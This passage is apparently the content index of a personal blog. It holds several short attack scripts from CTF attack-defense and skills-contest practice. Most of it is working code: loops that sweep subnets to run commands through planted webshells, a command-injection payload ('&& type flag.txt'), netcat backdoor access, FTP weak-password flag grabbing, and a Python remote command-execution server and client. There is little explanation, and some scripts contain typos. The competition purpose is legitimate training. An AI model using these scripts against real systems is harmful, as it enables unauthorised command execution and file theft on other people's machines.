threading.Thread(target=mysql, args=(i,)) t.start() 转载请标明出处","categories":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/tags/Python/"}]},{"title":"【Python】:WebShell","slug":"Python脚本WebShell","date":"2018-10-10T00:00:00.000Z","updated":"2019-10-25T08:22:56.197Z","comments":true,"path":"2018/10/10/Python脚本WebShell/","link":"","permalink":"https://hu5k7.github.io/2018/10/10/Python脚本WebShell/","excerpt":"","text":"1234567891011121314151617import requestsimport threadingflag = open(\"webshellsave.txt\",\"a\")def run(i): ip=\"192.168.\"+str(i)+\".128\" url=\"http://\"+ip+\"/WebShell.php/\" payload=&#123;'cmd':'cat /root/flag*.txt'&#125; try: r = requests.get(url,payload,timeout=1) flag.write(r.url+\"\\n\"+r.text) print(\"GET FLAG! &gt;&gt;\",r.url,'\\n',r.text) except: print(\"\\nConnect Fail &gt;&gt;\",url)for i in range(101,254): t = threading.Thread(target=run, args=(i,)) t.start() 转载请标明出处","categories":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/tags/Python/"}]},{"title":"【Python】:Web_Dirs_Scnnaer","slug":"Python脚本Web_Dirs_Scanner","date":"2018-10-10T00:00:00.000Z","updated":"2019-10-25T08:22:59.293Z","comments":true,"path":"2018/10/10/Python脚本Web_Dirs_Scanner/","link":"","permalink":"https://hu5k7.github.io/2018/10/10/Python脚本Web_Dirs_Scanner/","excerpt":"","text":"0x00 介绍看到一些web目录扫描器。自己也尝试写了一下xD 12345678910111213141516171819202122232425262728import requestsimport randomimport reuser_agent_list = [&#123;'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'&#125;,]user_agent = random.choice(user_agent_list)target = input(\"target host &gt;\")dict_path_file = input(\"dicr file &gt;\")def CheckURLProtocol(): Check = re.match(r\"http?://\",target) if Check == None: print(\"[-]Example: http://127.0.0.1 or https://127.0.0.1\") exit(0) else: with open(dict_path_file) as f: for dic in f.readlines(): url = target + str(dic) url = url.replace(\"\\n\",\"\") try: r = requests.get(url,headers=user_agent) if r.status_code == 200: print(r.url) except: pass 转载请标明出处","categories":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/tags/Python/"}]},{"title":"【Python】:WebShell_urilb","slug":"Python脚本WebShell_urilb","date":"2018-10-10T00:00:00.000Z","updated":"2019-10-25T08:22:52.701Z","comments":true,"path":"2018/10/10/Python脚本WebShell_urilb/","link":"","permalink":"https://hu5k7.github.io/2018/10/10/Python脚本WebShell_urilb/","excerpt":"","text":"0x00 介绍使用urlilb模块 在一些特定的攻防比赛中，攻击机没有安装requests模块，只能使用urlilb模块来代替 1234567891011121314151617import urllib.parseimport urllib.requestimport threadingdef WebShell(i): data = &#123;\"dir\": \"&amp;&amp; type flag.txt\"&#125; url = \"http://192.168.123.\"+str(i)+\"/DirCtrl.php\" data_string=urllib.parse.urlencode(data) new_url=url+\"?\"+data_string try: send = urllib.request.urlopen(new_url,timeout=1) print(send.read().decode(\"utf8\",\"ignore\")) except: passfor i in range(1,255): t = threading.Thread(target=WebShell, args=(i, )) t.start() 转载请标明出处","categories":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/tags/Python/"}]},{"title":"【Python】:socket_cmd连接","slug":"Python脚本socket_cmd连接","date":"2018-10-10T00:00:00.000Z","updated":"2019-10-25T08:23:03.941Z","comments":true,"path":"2018/10/10/Python脚本socket_cmd连接/","link":"","permalink":"https://hu5k7.github.io/2018/10/10/Python脚本socket_cmd连接/","excerpt":"","text":"0x00 介绍为了给学弟上公开课刻意写了一个远控脚本，虽然不这么行xD Server: 123456789101112131415161718192021import socket,osdef main(): global data, s s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind(('127.0.0.1',10001)) s.listen(5) print(\"等待连接中……\") while True: conn,addr = s.accept() while True: print('收到命令') data = conn.recv(1024) cmd = os.popen(data.decode()) os_result = cmd.read() conn.sendall(os_result.encode('utf8'))if __name__ == '__main__': main() Client: 1234567891011121314151617import socketServerIP=('127.0.0.1',10001)try: s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0) s.connect(ServerIP) print('[+]连接成功')except: print('[-]服务器无响应') exit(0)while True: data=input('[CMD]&gt;&gt;') s.sendto(bytes(data,encoding='utf8'),ServerIP) data = s.recv(1024) print('[+]回显成功') print(data.decode()) 转载请标明出处","categories":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/tags/Python/"}]},{"title":"【Python】:端口扫描","slug":"Python脚本端口扫描(PortScanner)","date":"2018-10-10T00:00:00.000Z","updated":"2019-10-25T08:23:12.479Z","comments":true,"path":"2018/10/10/Python脚本端口扫描(PortScanner)/","link":"","permalink":"https://hu5k7.github.io/2018/10/10/Python脚本端口扫描(PortScanner)/","excerpt":"","text":"0x00 介绍在实训室无聊的时候，随手写了一下端口扫描的Python脚本. 12345678910111213141516171819import socketimport threadingfile=open(\"port.txt\",'w+')def portscan(port): host='192.168.174.1' try: s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) conn=s.connect_ex((host,port)) if conn ==0: print(\"HOST &gt; &#123;&#125; : OPEN : &#123;&#125;\".format(host,post)) file.write(host+\":\"+str(post)+\"\\n\") else: pass excpet: passfor port in range(1,65535): t=threading.Thread(target=portscan, args=(port, )) t.start() 转载请标明出处","categories":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/tags/Python/"}]},{"title":"Shell脚本","slug":"Shell脚本","date":"2018-10-09T00:00:00.000Z","updated":"2019-10-25T08:23:19.479Z","comments":true,"path":"2018/10/09/Shell脚本/","link":"","permalink":"https://hu5k7.github.io/2018/10/09/Shell脚本/","excerpt":"","text":"0x00 介绍我在全国职业技能大赛比赛时所用的shell脚本: 1234567nc后门:port=10001 for i in `seq 101 254`;doip=\"192.168.2.\"$ipayload=`echo \"cat /root/flag*.txt;exit\" | nc $ip $port`done 123456webshell:or i in `seq 101 254`;doip=\"192.168.2.\"$icurl http://$ip/WebShell.php/?cmd=cat+%2Froot%2Fflag*.txtdone 1234567ftp:username='admin'passwd='123456'for i in `seq 101 254`;doip=\"192.168.2.\"$ish ftpmain.sh $ip $username $passwd 1234567#配合ftp使用ftpmain:ftp $1 -invuser $2 $3get /root/flag*.txtbye! 有一些地方得注意改动，什么IP地址NC后门的端口FTP那边的弱用户弱密码什么的等等…。尤其是一些标点符号的小细节不能忘记，该空格的地方就得空格，最好先实验一遍在拿去实战这些都可以拿到一些攻防比赛 如: CTF的AWD 或者一些 技能大赛 转载请标明出处","categories":[{"name":"Shell","slug":"Shell","permalink":"https://hu5k7.github.io/categories/Shell/"}],"tags":[{"name":"Shell","slug":"Shell","permalink":"https://hu5k7.github.io/tags/Shell/"}]}]}